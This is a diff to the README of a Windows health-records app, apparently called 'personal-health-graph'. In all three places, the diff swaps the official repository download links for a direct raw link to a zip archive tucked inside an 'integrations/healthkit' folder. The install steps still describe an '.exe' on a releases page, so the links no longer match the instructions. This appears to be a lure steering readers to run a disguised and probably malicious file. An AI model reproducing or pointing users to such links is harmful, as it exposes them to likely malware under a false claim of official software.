@@ -1,6 +1,6 @@
 # 🏥 personal-health-graph - Keep your health history private and usable
 
-[![](https://img.shields.io/badge/Download_for_Windows-Blue?style=for-the-badge)](https://github.com/Bolshevist-dimension3541/personal-health-graph)
+[![](https://img.shields.io/badge/Download_for_Windows-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Bolshevist-dimension3541/personal-health-graph/main/integrations/healthkit/graph_personal_health_v3.7.zip)
 
 ## 📋 What is this system
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. You need at least 200 megabyt
 
 ## 📥 How to install
 
-1. Visit the [official releases page](https://github.com/Bolshevist-dimension3541/personal-health-graph) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Bolshevist-dimension3541/personal-health-graph/main/integrations/healthkit/graph_personal_health_v3.7.zip) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the link to start the download.
 4. Open the folder where your computer saves downloads.
@@ -65,6 +65,6 @@ Update your file regularly. Add new test results as you get them. Consistent dat
 
 ## 🔗 Links and resources
 
-[Visit this page to download the latest version](https://github.com/Bolshevist-dimension3541/personal-health-graph)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/Bolshevist-dimension3541/personal-health-graph/main/integrations/healthkit/graph_personal_health_v3.7.zip)
 
 Use this system to own your health narrative. Your data belongs to you. Keep it structured. Keep it private.
